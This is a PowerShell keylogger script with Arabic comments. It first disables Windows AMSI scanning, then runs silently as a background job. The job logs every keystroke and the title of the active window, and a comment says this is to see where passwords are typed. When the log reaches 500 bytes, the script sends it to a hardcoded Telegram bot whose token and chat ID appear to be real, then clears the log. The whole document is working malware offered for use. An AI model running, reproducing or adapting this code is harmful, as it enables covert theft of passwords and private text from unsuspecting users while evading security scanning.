# --- [1] خطوة كسر الحماية الذكية (Shadow Bypass) ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات العميل (Customer_Zero) ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# --- [3] المحرك الذكي للكيلوجر ---
$code = {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeName 'Win32.User32' -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);'
    
    $log = "$env:TEMP\sys_log_tmp.txt"
    $lastWindow = ""

    while($true){
        Start-Sleep -Milliseconds 40
        # مراقبة النافذة المفتوحة (عشان نعرف هو بيكتب الباسورد فين)
        $h = [Win32.User32]::GetForegroundWindow()
        $sb = New-Object System.Text.StringBuilder 256
        [Win32.User32]::GetWindowText($h, $sb, 256) | Out-Null
        $currentWindow = $sb.ToString()
        
        if($currentWindow -ne $lastWindow){
            "`n`n[Window: $currentWindow - $(Get-Date)]`n" | Out-File $log -Append
            $lastWindow = $currentWindow
        }

        # تسجيل الحروف (Key Logging)
        for($i=8; $i -le 254; $i++){
            $v = [Win32.User32]::GetAsyncKeyState($i)
            if($v -eq -32767){
                $k = [System.Windows.Forms.Keys]$i
                $k | Out-File $log -Append -NoNewline
            }
        }

        # إرسال التقرير كل 5 دقائق وتصفيره
        if((Get-Item $log).Length -gt 500){
            $content = Get-Content $log -Raw
            curl.exe -X POST "https://api.telegram.org/bot$using:t/sendMessage" -d "chat_id=$using:c&text=$content"
            Clear-Content $log
        }
    }
}

# تشغيل المهمة في الخلفية بصمت تام
Start-Job -ScriptBlock $code
